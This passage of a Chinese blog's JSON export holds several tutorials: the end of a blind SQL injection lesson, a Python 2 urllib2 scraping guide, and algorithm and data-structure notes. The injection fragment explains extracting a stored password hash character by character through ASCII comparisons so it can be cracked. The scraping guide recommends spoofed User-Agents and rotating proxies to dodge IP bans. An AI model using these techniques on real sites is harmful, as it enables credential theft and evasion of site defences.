好，回车之后发现返回页面的结果是正确的，证明16位的md5值第一位是97ascii码表的对应值，也就是“a” 接下来我们猜第二位， 这次我把值设置为&lt;=52 发现是正确的，那么说明这个结果可能少于52又或者等于52，所以继续猜，最后我发现这个结果是等于52。 所以是ascii码对应的值“4”，以此类推，值到把16位md5值猜解完毕，猜解得到的md5值，就可以进行md5解密了。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://xiaowuyoucy.github.io/tags/sql注入/"},{"name":"web渗透","slug":"web渗透","permalink":"https://xiaowuyoucy.github.io/tags/web渗透/"}]},{"title":"urlib2库的基本使用","slug":"201902262135","date":"2017-07-23T09:20:34.000Z","updated":"2019-04-14T18:24:45.251Z","comments":true,"path":"2017/07/23/201902262135/","link":"","permalink":"https://xiaowuyoucy.github.io/2017/07/23/201902262135/","excerpt":"","text":"所谓⽹⻚抓取，就是把 URL 地址中指定的⽹络资源从⽹络流中读取出来，保存到本地。 在 Python 中，我们使⽤ urllib2 这个组件来抓取⽹⻚。 urllib2 是 Python2.7 ⾃带的模块(不需要下载)， 是 Python 的⼀个获取URLs(Uniform Resource Locators)的重要组件。 urllib2 官⽅⽂档：https://docs.python.org/2/library/urllib2.html urllib2 源码：https://hg.python.org/cpython/file/2.7/Lib/urllib2.py urllib2 在 python3.x 中被改为 urllib.request 1.urlopen 我们先来段代码： 12345# urllib2_baidu.pyimport urllib2response = urllib2.urlopen(\"http://www.baidu.com\")html = response.read()print html So Easy! 最简单的获取⼀个 url 的⻚⾯代码居然只需要 4⾏！ 执⾏写的 python 代码: 1Power@PowerMac ~$: python urllib2_baidu.py 会看到以下结果： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"&gt;&lt;meta content=\"always\" name=\"referrer\"&gt;&lt;meta name=\"theme-color\" content=\"#2932e1\"&gt;&lt;link rel=\"shortcut icon\" href=\"/favicon.ico\" type=\"image/x-icon\" /&gt;&lt;link rel=\"search\" type=\"application/opensearchdescription+xml\" href=\"/content-search.xml\" title=\"百度搜索\" /&gt;&lt;link rel=\"icon\" sizes=\"any\" mask href=\"//www.baidu.com/img/baidu.svg\"&gt;&lt;link rel=\"dns-prefetch\" href=\"//s1.bdstatic.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t1.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t2.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t3.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t10.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t11.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//t12.baidu.com\"/&gt;&lt;link rel=\"dns-prefetch\" href=\"//b1.bdstatic.com\"/&gt;&lt;title&gt;百度⼀下，你就知道&lt;/title&gt; ... ​ 实际上，如果我们在浏览器上打开百度主⻚， 右键选择“查看源代码”，你会发现，跟我们刚才打印出来的是⼀模⼀样。也就是说，上⾯的4⾏代码就已经帮我们把百度的⾸⻚的全部代码爬了下来。 分析代码： 我们来分析⼀下上⾯的这 4⾏代码： 1.第⼀⾏： 1import urllib2 就是将 urllib2 组建引⼊进来，供给我们使⽤。 2.第⼆⾏ 1response = urllib2.urlopen(\"http://www.baidu.com\") 然后我们调⽤的是 urllib2 库⾥⾯的 urlopen ⽅法，传⼊的 url⽹址是百度⾸⻚， urlopen()⽅法⼀般接受三个参数：urlopen(url, data=None, timeout=) 第⼀个参数 URL 是必须要传送的，可以传⼊⼀个字符串类型的url 地址，同时打开这个 url 并返回⼀个像⽂件对象⼀样的对象。 第⼆个参数是 data 是经过编码的 post 数据（⼀般使⽤urllib.urlencode()来编码，我们后⾯会说到），默认为空None；第三个参数是 timeout 是可选的超时期（以秒为单位），供所有阻塞操作内部使⽤。默认为 60s，也可以直接设置 timeout=10 3.第三⾏ 1html = response.read() urlopen()返回的⽂件对象，除了⽀持⽂件⽅法外，还⽀持下⾯的这 些常⽤的⽅法： response.getcode() 返回整数形式的 HTTP 响应代码，⽐如成功返回 200,未找到⽂件时返回 404 response.geturl() 返回所返回的数据的实际 url，但是会考虑发⽣的重定向问题 response.info() 返回映射对象，该对象带有与 url 关联的信息，对 HTTP 来说， 返回的服务器响应包含 HTTP 报头 4.第四⾏ 1print html 最后就是将字符串打出来，显示到终端上。 ⼀个基本的 url 请求对应的 python 代码真的⾮常简单。 Request 我们编辑 urllib2_test2.py 123456# urllib2_request.pyimport urllib2request = urllib2.Request(\"http://www.baidu.com\")response = urllib2.urlopen(request)html = response.read()print html 运⾏结果是完全⼀样的： 在我们第⼀个例⼦⾥，urlopen()的 url 参数就是⼀个 url 地址；但是如果需要执⾏更复杂的操作，⽐如增加 HTTP 报头，可以创建⼀个Request 实例来作为 urlopen()的 url 参数，⽽url 地址则作为 Request 实例 的参数。 新建 Request 实例，url 为 url 字符串，data 是伴随 url 提交的数据（⽐如要 post 的数据），headers 是⼀个字典，包含了可表示 HTTP 报头的键值对,注意，data 请求为空时，默认 HTTP 请求为&quot;GET&quot;，提供 data 参数时，HTTP 请求将从&quot;GET&quot;改为‘POST’。 2.User-Agent 但是这样直接⽤python的urllib2给⼀个⽹站发送请求的话，确实略有些唐突了，就好⽐，⼈家每家都有⻔，你以⼀个路⼈的身份直接闯进去显然不是很礼貌。所以有⼀些站点不喜欢被程序（⾮⼈为访问）访问，有可能会拒绝你的访问请求。 ​ 但是如果我们⽤⼀个合法的身份去请求别⼈⽹站，显然⼈家就是欢迎的。 所以我们就应该给我们的这个代码加上⼀个身份，就是所谓的 User-Agent 头。 User-Agent？显然如果你不是学习前端专业的，这个东⻄确实对于后端开发⼯程师是⼀个头疼的东⻄， 不过不要紧，不是我们的东⻄我们只作为了解即可。 我们只需要知道，⽤ 不同的浏览器 在发送请求的时候，会有不同的 UserAgent 头。 浏览器 就是互联⽹世界上 被允许的身份 。 那么如果你不想你的爬⾍代码成为⼀个路⼈，你需要伪装成⼀个被 公认的浏览器 。伪装的办法就是给⾃⼰的请求加上⼀个对应的 User-Agent 头。 12345678910#urllib2_useragent.pyimport urllib2url = \"http://www.baidu.com\"#IE 9.0 的 User-Agentheader = &#123;\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"&#125;request = urllib2.Request(url, headers = header)response = urllib2.urlopen(req)html = response.read()print html 3.添加更多的 Header 信息 在 HTTP Request 中加⼊特定的 Header，来构造⼀个完整的 HTTP 请求消息。 可以通过调⽤ Request.add_header() 添加/修改⼀个特定的 header 123456789101112131415# urllib2_headers.pyimport urllib2url = \"http://www.baidu.com\"#IE 9.0 的 User-Agentheader = &#123;\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"&#125;request = urllib2.Request(url, headers = header)#也可以通过调⽤Request.add_header() 添加/修改⼀个特定的 headerrequest.add_header(\"Connection\", \"keep-alive\")# 也可以通过调⽤Request.get_header()来查看 header 信息# request.get_header(header_name=\"Connection\")response = urllib2.urlopen(req)print response.code #可以查看响应状态码html = response.read()print html headers 的⼀些属性，需要特别注意⼀下： User-Agent : 有些服务器或 Proxy 会通过该值来判断是否是浏览器发出的请求; Content-Type : ⽤来确定 HTTP Body 中的内容该怎样解析， 服务 器会检查该值，设置错误会导致服务器拒绝服务 application/xml ： 在 XML RPC 调⽤时使⽤ application/json ： 在 JSON RPC 调⽤时使⽤ application/x-www-form-urlencoded ： 浏览器提交 Web 表单时使⽤ 4.数据传送 上⾯演示的都是最基本的⽹⻚抓取，有时候我们也希望发送⼀些数据到URL， ⽐如账号密码、表单数据等等，这样也能得到相应的响应。 urllib2 默认只⽀持 HTTP 的 GET 和 POST ⽅法 Get⽅式 GET 请求⼀般⽤于我们向服务器获取数据，⽐如说，我们⽤百度搜索 老男孩 https://www.baidu.com/s?wd= 老男孩 在其中我们可以看到在 http://www.baidu.com/s? 之后出现⼀个⻓⻓的字符串，其中就包含我们要查询的关键词。通过 Fiddler 观察，发现 URL 的QueryString 查询字符串的键是 wd ，于是我们可以尝试⽤默认的 Get⽅式来 发送请求。 12345678910111213# urllib2_get.pyimport urllib #负责 url 编码处理import urllib2url = \"http://www.baidu.com/s\"word = &#123;\"wd\":\"老男孩\"&#125;word = urllib.urlencode(word) #转换成 url 编码格式（字符串）newurl = url + \"?\" + word # url⾸个分隔符就是 ?headers=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"&#125;request = urllib2.Request(newurl, headers=headers)response = urllib2.urlopen(request)print response.read() ⼀般 HTTP 请求提交 HTML 表单数据，word 需要编码成 URL 编码格式，然后 做为参数传到 Request 对象。 urllib 和 urllib2 都是接受 URL 请求的相关模块，但是提供了不同的功能。 两个最显著的不同如下： urllib 仅可以接受 URL，⽽ urllib2 可以接受⼀个设置了 headers 的Request 类实例。这表示我们可以伪装⾃⼰的 User Agent 字符串等。 urllib 提供 urlencode ⽅法⽤来 GET 查询字符串的产⽣，⽽ urllib2没有。这是为何 urllib 常和 urllib2 ⼀起使⽤的原因。 编码⼯作使⽤urllib 的 urlencode() 函数，帮我们将 key:value 这样的键值对转换成 “key=value” 这样的字符串，解码⼯作可以使⽤urllib 的 unquote() 函数。（注意，不是 urllib2.urlencode() ) 12345678910# IPython2 中的测试结果In [1]: import urllibIn [2]: word = &#123;\"wd\":\"老男孩\"&#125;# 将字典按 URL 编码转换，汉字部分先转成 GBK 编码，然后把 \\x 替换成 %In [3]: urllib.urlencode(word)Out[3]: \"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\"# 把 % 替换成 \\x，变回 GBK 编码，打印出来In [4]: print urllib.unquote(\"wd=%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2\")wd=老男孩 **POST⽅式： ** 上⾯我们说了 Request 请求对象的⾥有 data 参数，它就是⽤在 POST⾥的，我 们要传送的数据就是这个参数 data，data 是⼀个字典，⾥⾯要匹配键值对。 拿拉勾⽹站数据举例，https://www.lagou.com/ 在站内搜索任意关键字 。 输⼊测试数据，再通过使⽤Fiddler 观察，其中有⼀条是 POST 请求，响应⽂件是 JSON 格式⽂件，⽽向服务器发送的请求数据并不是在 url⾥，那么我们可以试着模拟这个 POST 请求。 于是，我们可以尝试⽤POST⽅式发送请求 1234567891011121314151617181920# urllib2_post.pyimport urllib2import urlliboutput = open(\"lagou.json\", \"w\")page = 1# POST 请求要传送的数据formdata = \"first=false&amp;pn=\" + str(page) + \"&amp;kd=xxx\"headers=&#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"&#125;request = urllib2.Request(\"http://www.lagou.com/jobs/positionAjax.json?px=new&amp;needAddtionalResult=false\", headers=headers)# 通过 request.add_data() 将 data 数据传进⼊request 内request.add_data(formdata)#print request.get_data()response = urllib2.urlopen(request)print response.code#print resHtmloutput.write(response.read())output.close() 当然可以⽤post 的⽅式发送账号密码到登录界⾯模拟登陆，当⽹⻚采⽤JavaScript 动态技术以后，想封锁基于 HttpClient 的模拟登录就太容易了，甚⾄可以根据你的⿏标活动的特征准确地判断出是不是真⼈在操作。 所以，想做通⽤的模拟登录还得选别的技术，⽐如⽤内置浏览器引擎的爬⾍(关键词：Cookie，PhantomJS，Selenium)，这个我们将在以后会学习到。 问题：为什么有时候 POST 也能在 URL 内看到数据？ GET⽅式是直接以链接形式访问，链接中包含了所有的参数，服务器端⽤Request.QueryString获取变量的值。如果包含了密码的话是⼀种不安全的选择，不过你可以直观地看到⾃⼰提交了什么内容。 POST则不会在⽹址上显示所有的参数，服务器端⽤Request.Form获取提交的数据，在 Form 提交的时候。但是 HTML 代码⾥如果不指 定 method 属性，则默认为 GET 请求，Form 中提交的数据将会附加 在 url 之后，以 ? 分开与 url 分开。 表单数据可以作为 URL 字段（method=“get”）或者 HTTP POST（method=“post”）的⽅式来发送。⽐如在下⾯的 HTML 代码中，表单数据将因为 （method=“get”） ⽽附加到 URL 上： 12345&lt;form action=\"form_action.asp\" method=\"get\"&gt;&lt;p&gt;First name: &lt;input type=\"text\" name=\"fname\" /&gt;&lt;/p&gt;&lt;p&gt;Last name: &lt;input type=\"text\" name=\"lname\" /&gt;&lt;/p&gt;&lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt; 5.⾃定义 Opener 基本的 urlopen()函数不⽀持代理、cookie 或其他的 HTTP⾼级功能。要⽀持这些功能， 必须使⽤ build_opener() 函数来创建⾃⼰的⾃定义opener 对象。 opener 是 urllib2.OpenerDirector 的实例，我们之前⼀直都在使⽤的urlopen，它是⼀个特殊的 opener install_opener 将⾃定义的 opener 对象 定义为 全局 opener，表示如果之后凡是调⽤urlopen，都将使⽤这个 opener（根据⾃⼰的需求来选择） 6.Proxy（代理）的设置 很多⽹站会检测某⼀段时间某个 IP 的访问次数，如果访问次数过多，它会禁⽌你的访问。所以我们可以设置⼀些代理服务器，每隔⼀段时间换⼀个代理，⽹站管理员就不知道是谁在捣⻤了。 urllib2 中通过 ProxyHandler 来设置使⽤代理服务器，下⾯代码说明如何实⽤⾃定义 opener 来使⽤代理： 123456789101112131415161718#urllib2_proxy.pyimport urllib2proxyWork = True #定义⼀个代理开关# 定义了两个代理模式，其中⼀个为不适⽤代理httpProxyHandler = urllib2.ProxyHandler(&#123;\"http\" : \"124.88.67.81:80\"&#125;)nullProxyHandler = urllib2.ProxyHandler(&#123;&#125;)if proxyWork: #根据代理开关是否打开，使⽤不同的代理模式opener = urllib2.build_opener(httpProxyHandler)else:opener = urllib2.build_opener(nullProxyHandler)# 如果这么写，之后的 urlopen 将使⽤这个 opener#urllib2.install_opener(opener)#response = urlopen(\"http://www.baidu.com/\")# 使⽤我们⾃定义的代理 opener 的 open()⽅法打开 urlresponse = opener.open(\"http://www.baidu.com/\")html = response.read()print html 7.Debug Log 使⽤ urllib2 时，可以通过下⾯的⽅法把 HTTP 和 HTTPS 的 debug Log 打开，这样程序在执⾏的时候，会把收发包的内容在屏幕上打印出来，⽅便调试，有时可以省去抓包的⼯作 。 123456789101112# urllib2_debuglog.pyimport urllib2# 打开 HTTP debug loghttpHandler = urllib2.HTTPHandler(debuglevel=1)# 打开 HTTPS debug loghttpsHandler = urllib2.HTTPSHandler(debuglevel=1)# 同时使⽤两种不同的 debug log 模式opener = urllib2.build_opener(httpHandler, httpsHandler)# 使⽤install_opener ⽤来创建全局的 openerurllib2.install_opener(opener)# urlopen() 默认使⽤之前创建的全局 openerresponse = urllib2.urlopen(\"http://www.baidu.com\") 8.Cookie Cookie 是指某些⽹站的 Web 服务器为了辨别⽤户身份和进⾏Session 跟踪⽽储存在⽤户浏览器上的⽂本⽂件，Cookie 可以保持登录信息到⽤户下次与服务器的会话。 Cookie 由变量名和值组成，根据 Netscape 公司的规定，Cookie 格式如下：Set－Cookie: NAME=VALUE；Expires=DATE；Path=PATH；Domain=DOMAIN_NAME； SECURE但是注意： 登录⼀般都会先有⼀个 HTTP GET，⽤于拉取⼀些信息及获得Cookie，然后再 HTTP POST 登录。 http POST 登录的链接有可能是动态的，从 GET 返回的信息中获取。 password 有些是明⽂发送，有些是加密后发送，有些甚⾄⽤动态加密的，包括了很多其他数据的加密信息，不只是密码。能通过查看JS 源码获得加密算法。 ⼤多数⽹站的登陆整体流程类似，可能有些细节不⼀样，所以不能 保证其他⽹站登录成功。 cookielib 库 cookielib 模块的主要作⽤是提供⽤于存储 cookie 的对象，⼀般与 urllib2 模块配 合使⽤，Python 处理 cookie 是⼀般是 cookielib 和 HTTPCookieProcessor⼀ 起使⽤。 该模块主要的对象有 CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。 它们的关系：CookieJar —-派⽣—-&gt; FileCookieJar(Cookie⽂件保存) —-派⽣—–&gt; MozillaCookieJar(Firefox 浏览器 Cookie) 和 LWPCookieJar。 CookieJar 管理 HTTP cookie 值、存储 HTTP 请求⽣成的 cookie、向传出的 HTTP请求添加 cookie 的对象。整个 cookie 都存储在内存中，对 CookieJar 实例进⾏垃圾回收后 cookie 也将丢失。 FileCookieJar (filename,delayload=None,policy=None) 创建 FileCookieJar 实例，检索 cookie 信息并将 cookie 存储到⽂件中。filename 是存储 cookie 的⽂件名。delayload 为 True 时⽀持延迟访问访问⽂件，即只有在需要时才读取⽂件或在⽂件中存储数据 MozillaCookieJar (filename,delayload=None,policy=None) 创建与 Mozilla 浏览器 cookies.txt 兼容的 FileCookieJar 实例。 LWPCookieJar (filename,delayload=None,policy=None) 创建与 libwww-perl 的 Set-Cookie3⽂件格式兼容的 FileCookieJar 实例。 1）使⽤get⽅式获取 Cookie 保存到变量 1234567891011121314151617# urllib2_cookielibtest1.pyimport urllib2import cookielib#声明⼀个 CookieJar 对象实例来保存 cookiecookie = cookielib.CookieJar()#利⽤urllib2 库的 HTTPCookieProcessor 对象来创建 cookie 处理器handler=urllib2.HTTPCookieProcessor(cookie)#通过 handler 来构建 openeropener = urllib2.build_opener(handler)#此处的 open⽅法同 urllib2 的 urlopen⽅法，也可以传⼊requestresponse = opener.open(\"http://www.baidu.com\")# 按标准格式存储 Cookiecookies = \"\"for item in cookie:cookies = cookies + item.name + \"=\" + item.value + \";\"# 舍去最后⼀位的分号print cookies[:-1] 我们使⽤以上⽅法将 cookie 保存到变量中，然后打印出了 cookie 中的值，运⾏结果如下： 123BAIDUID=4327A58E63A92B73FF7A297FB3B2B4D0:FG=1;BIDUPSID=4327A58E63A92B73FF7A297FB3B2B4D0;H_PS_PSSID=1429_21115_17001_21454_21409_21554_21398;PSTM=1480815736;BDSVRTM=0;BD_HOME=0 2) 访问⽹站获得 cookie，并把获得的 cookie 保存在 cookie⽂件中 123456789101112131415# urllib2_cookielibtest2.pyimport cookielibimport urllib2# 设置保存 cookie 的⽂件，同级⽬录下的 cookie.txtfilename = 'cookie.txt'# 声明⼀个 LWPCookieJar(有 save 实现)对象实例来保存 cookie，之后写⼊⽂件cookie = cookielib.LWPCookieJar(filename)# 利⽤urllib2 库的 HTTPCookieProcessor 对象来创建 cookie 处理器handler = urllib2.HTTPCookieProcessor(cookie)# 通过 handler 来构建 openeropener = urllib2.build_opener(handler)# 创建⼀个请求，原理同 urllib2 的 urlopenresponse = opener.open(\"http://www.baidu.com\")# 保存 cookie 到⽂件，且忽略 cookie 失效限制cookie.save(ignore_discard=True, ignore_expires=True) 3) 从⽂件中获取 cookies 并访问 12345678910111213# urllib2_cookielibtest2.pyimport cookielibimport urllib2# 创建 LWPCookieJar(有 load 实现)实例对象cookie = cookielib.LWPCookieJar()# 从⽂件中读取 cookie 内容到变量，忽略 cookie 的使⽤时效cookie.load('cookie.txt', ignore_discard=True, ignore_expires=True)# 创建请求的 requestreq = urllib2.Request(\"http://www.baidu.com\")# 利⽤urllib2 的 build_opener⽅法创建⼀个 openeropener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))response = opener.open(req)print response.read()","categories":[{"name":"网络爬虫","slug":"网络爬虫","permalink":"https://xiaowuyoucy.github.io/categories/网络爬虫/"}],"tags":[{"name":"urlib2","slug":"urlib2","permalink":"https://xiaowuyoucy.github.io/tags/urlib2/"}]},{"title":"数据结构与算法","slug":"201607092036","date":"2016-07-09T12:36:18.000Z","updated":"2019-04-09T19:05:16.770Z","comments":true,"path":"2016/07/09/201607092036/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/07/09/201607092036/","excerpt":"","text":"算法的概念 算法是计算机处理信息的本质，因为计算机程序本质上是一个算法来告诉计算机确切的步骤来执行一个指定的任务。一般地，当算法在处理信息时，会从输入设备或数据的存储地址读取数据，把结果写入输出设备或某个存储地址供以后再调用。 算法是独立存在的一种解决问题的方法和思想。 对于算法而言，实现的语言并不重要，重要的是思想。 算法可以有不同的语言描述实现版本（如C描述、C++描述、Python描述等），我们现在是在用Python语言进行描述实现。 算法的五大特性 输入: 算法具有0个或多个输入 输出: 算法至少有1个或多个输出 有穷性: 算法在有限的步骤之后会自动结束而不会无限循环，并且每一个步骤可以在可接受的时间内完成 确定性：算法中的每一步都有确定的含义，不会出现二义性 可行性：算法的每一步都是可行的，也就是说每一步都能够执行有限的次数完成 引入案例 如果 a+b+c=1000，且 a2a^{2}a2+b2b^{2}b2=c2c^{2}c2（a,b,c 为自然数），如何求出所有a、b、c可能的组合? 题解: 1234567891011121314import timestart_time = time.time()# 注意是三重循环for a in range(0, 1001): for b in range(0, 1001): for c in range(0, 1001): if a**2 + b**2 == c**2 and a+b+c == 1000: print(\"a, b, c: %d, %d, %d\" % (a, b, c))end_time = time.time()print(\"elapsed: %f\" % (end_time - start_time))print(\"complete!\") 运行结果： 123456a, b, c: 0, 500, 500a, b, c: 200, 375, 425a, b, c: 375, 200, 425a, b, c: 500, 0, 500elapsed: 214.583347complete! 注意运行的时间:214.583347秒 显然是一个失败的算法，将近用了4分钟，我们先明确一下这道题的一些要求和规律，当中的 A,B,C 其当中的一个数和另外的两个数是有关系的，当我们知道 A,B的时候 C的结果其实已经被确定了，我们可以把结果抽象成算式 C = 1000 - B - A 优化代码： 1234567891011121314import timestart_time = time.time()# 注意是两重循环for a in range(0, 1001): for b in range(0, 1001-a): c = 1000 - a - b if a**2 + b**2 == c**2: print(\"a, b, c: %d, %d, %d\" % (a, b, c))end_time = time.time()print(\"elapsed: %f\" % (end_time - start_time))print(\"complete!\") 注意运行的时间:0.182897秒 计算效率均衡 执行时间反应算法效率 对于同一问题，我们给出了两种解决算法，在两种算法的实现中，我们对程序执行的时间进行了测算，发现两段程序执行的时间相差悬殊（214.583347秒相比于0.182897秒），由此我们可以得出结论：实现算法程序的执行时间可以反应出算法的效率，即算法的优劣。 单靠时间值绝对可信吗？ 假设我们将第二次尝试的算法程序运行在一台配置古老性能低下的计算机中，情况会如何？很可能运行的时间并不会比在我们的电脑中运行算法一的214.583347秒快多少。 单纯依靠运行的时间来比较算法的优劣并不一定是客观准确的！ 程序的运行离不开计算机环境（包括硬件和操作系统），这些客观原因会影响程序运行的速度并反应在程序的执行时间上。那么如何才能客观的评判一个算法的优劣呢？ 时间复杂度与“大O记法 我们假定计算机执行算法每一个基本操作的时间是固定的一个时间单位，那么有多少个基本操作就代表会花费多少时间单位。算然对于不同的机器环境而言，确切的单位时间是不同的，但是对于算法进行多少个基本操作（即花费多少时间单位）在规模数量级上却是相同的，由此可以忽略机器环境的影响而客观的反应算法的时间效率。 对于算法的时间效率，我们可以用“大O记法”来表示。 “大O记法”：对于单调的整数函数f，如果存在一个整数函数g和实常数c&gt;0，使得对于充分大的n总有f(n)&lt;=c*g(n)，就说函数g是f的一个渐近函数（忽略常数），记为f(n)=O(g(n))。也就是说，在趋向无穷的极限意义下，函数f的增长速度受到函数g的约束，亦即函数f与函数g的特征相似。 时间复杂度：假设存在函数g，使得算法A处理规模为n的问题示例所用时间为T(n)=O(g(n))，则称O(g(n))为算法A的渐近时间复杂度，简称时间复杂度，记为T(n) 如何理解“大O记法” 对于算法进行特别具体的细致分析虽然很好，但在实践中的实际价值有限。对于算法的时间性质和空间性质，最重要的是其数量级和趋势，这些是分析算法效率的主要部分。而计量算法基本操作数量的规模函数中那些常量因子可以忽略不计。例如，可以认为 3n23n{^2}3n2 和 100n2100n{^2}100n2属于同一个量级，如果两个算法处理同样规模实例的代价分别为这两个函数，就认为它们的效率“差不多”，都为 n2n^{2}n2级 最坏时间复杂度 分析算法时，存在几种可能的考虑： 算法完成工作最少需要多少基本操作，即最优时间复杂度 算法完成工作最多需要多少基本操作，即最坏时间复杂度 算法完成工作平均需要多少基本操作，即平均时间复杂度 对于最优时间复杂度，其价值不大，因为它没有提供什么有用信息，其反映的只是最乐观最理想的情况，没有参考价值。 对于最坏时间复杂度，提供了一种保证，表明算法在此种程度的基本操作中一定能完成工作。 对于平均时间复杂度，是对算法的一个全面评价，因此它完整全面的反映了这个算法的性质。但另一方面，这种衡量并没有保证，不是每个计算都能在这个基本操作内完成。而且，对于平均情况的计算，也会因为应用算法的实例分布可能并不均匀而难以计算。 因此，我们主要关注算法的最坏情况，亦即最坏时间复杂度。 时间复杂度的几条基本计算规则 基本操作，即只有常数项，认为其时间复杂度为O(1) 顺序结构，时间复杂度按加法进行计算 循环结构，时间复杂度按乘法进行计算 分支结构，时间复杂度取最大值 判断一个算法的效率时，往往只需要关注操作数量的最高次项，其它次要项和常数项可以忽略 在没有特殊说明时，我们所分析的算法的时间复杂度都是指最坏时间复杂度 算法分析 第一次尝试的算法核心部分 12345for a in range(0, 1001): for b in range(0, 1001): for c in range(0, 1001): if a**2 + b**2 == c**2 and a+b+c == 1000: print(\"a, b, c: %d, %d, %d\" % (a, b, c)) 时间复杂度： T(n) = O(n * n *n) = O(n3) ​ 2.第二次尝试的算法核心部分 12345for a in range(0, 1001): for b in range(0, 1001-a): c = 1000 - a - b if a**2 + b**2 == c**2: print(\"a, b, c: %d, %d, %d\" % (a, b, c)) 时间复杂度： T(n) = O(n * n * (1+1)) = O(n*n) = O(n2) 由此可见，我们尝试的第二种算法要比第一种算法的时间复杂度好多的。 常见时间复杂度 注意，经常将log2n（以2为底的对数）简写成logn 所消耗的时间从小到大 O(1) &lt; O(logn) &lt; O(n) &lt; O(nlogn) &lt; O(n2n^{2}n2) &lt; O((n3n^{3}n3) &lt; O((2n2^{n}2n) &lt; O(n!) &lt; O(nn) 练习： 时间复杂度练习( 参考算法的效率规则判断 ) O(5) O(2n + 1) O(n²+ n + 1) O(3n³+1)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://xiaowuyoucy.github.io/tags/算法/"}]},{"title":"数据结构顺序表的形式","slug":"201604101526","date":"2016-04-19T07:26:18.000Z","updated":"2019-04-10T07:52:28.962Z","comments":true,"path":"2016/04/19/201604101526/","link":"","permalink":"https://xiaowuyoucy.github.io/2016/04/19/201604101526/","excerpt":"","text":"顺序表 在程序中，经常需要将一组（通常是同为某个类型的）数据元素作为整体管理和使用，需要创建这种元素组，用变量记录它们，传进传出函数等。一组数据中包含的元素个数可能发生变化（可以增加或删除元素）。对于这种需求，最简单的解决方案便是将这样一组元素看成一个序列，用元素在序列里的位置和顺序，表示实际应用中的某种有意义的信息，或者表示数据之间的某种关系。这样的一组序列元素的组织形式，我们可以将其抽象为线性表。一个线性表是某类元素的一个集合，还记录着元素之间的一种顺序关系。线性表是最基本的数据结构之一，在实际程序中应用非常广泛，它还经常被用作更复杂的数据结构的实现基础。根据线性表的实际存储方式， 分为两种实现模型： 顺序表，将元素顺序地存放在一块连续的存储区里，元素间的顺序关系由它们的存储顺序自然表示。 链表，将元素存放在通过链接构造起来的一系列存储块中。 顺序表的基本形式 图a表示的是顺序表的基本形式，数据元素本身连续存储，每个元素所占的存储单元大小固定相同，元素的下标是其逻辑地址，而元素存储的物理地址（实际内存地址）可以通过存储区的起始地址Loc (e0)加上逻辑地址（第i个元素）与存储单元大小（c）的乘积计算而得，即： Loc(ei) = Loc(e0) + c*i 故，访问指定元素时无需从头遍历，通过计算便可获得对应地址，其时间复杂度为O(1)。 如果元素的大小不统一，则须采用图b的元素外置的形式，将实际数据元素另行存储，而顺序表中各单元位置保存对应元素的地址信息（即链接）。由于每个链接所需的存储量相同，通过上述公式，可以计算出元素链接的存储位置，而后顺着链接找到实际存储的数据元素。注意，图b中的c不再是数据元素的大小，而是存储一个链接地址所需的存储量，这个量通常很小。 图b这样的顺序表也被称为对实际数据的索引，这是最简单的索引结构。 顺序表的结构与实现 一个顺序表的完整信息包括两部分，一部分是表中的元素集合，另一部分是为实现正确操作而需记录的信息，即有关表的整体情况的信息，这部分信息主要包括元素存储区的容量和当前表中已有的元素个数两项。 顺序表的两种基本实现方式 图a为一体式结构，存储表信息的单元与元素存储区以连续的方式安排在一块存储区里，两部分数据的整体形成一个完整的顺序表对象;一体式结构整体性强，易于管理。但是由于数据元素存储区域是表对象的一部分，顺序表创建后，元素存储区就固定了;图b为分离式结构，表对象里只保存与整个表有关的信息（即容量和元素个数），实际数据元素存放在另一个独立的元素存储区里，通过链接与基本表对象关联。 元素存储区替换 一体式结构由于顺序表信息区与数据区连续存储在一起，所以若想更换数据区，则只能整体搬迁，即整个顺序表对象（指存储顺序表的结构信息的区域）改变了。 分离式结构若想更换数据区，只需将表信息区中的数据区链接地址更新即可，而该顺序表对象不变。 元素存储区扩充 采用分离式结构的顺序表，若将数据区更换为存储空间更大的区域，则可以在不改变表对象的前提下对其数据存储区进行了扩充，所有使用这个表的地方都不必修改。只要程序的运行环境（计算机系统）还有空闲存储，这种表结构就不会因为满了而导致操作无法进行。人们把采用这种技术实现的顺序表称为动态顺序表，因为其容量可以在使用中动态变化。 扩充的两种策略 每次扩充增加固定数目的存储位置，如每次扩充增加10个元素位置，这种策略可称为线性增长。 特点：节省空间，但是扩充操作频繁，操作次数多。 每次扩充容量加倍，如每次扩充增加一倍存储空间。 特点：减少了扩充操作的执行次数，但可能会浪费空间资源。以空间换时间，推荐的方式。 顺序表的操作 增加元素 如图所示，为顺序表增加新元素111的三种方式 a. 尾端加入元素，时间复杂度为O(1) b. 非保序的加入元素（不常见），时间复杂度为O(1) c. 保序的元素加入，时间复杂度为O(n) 删除元素 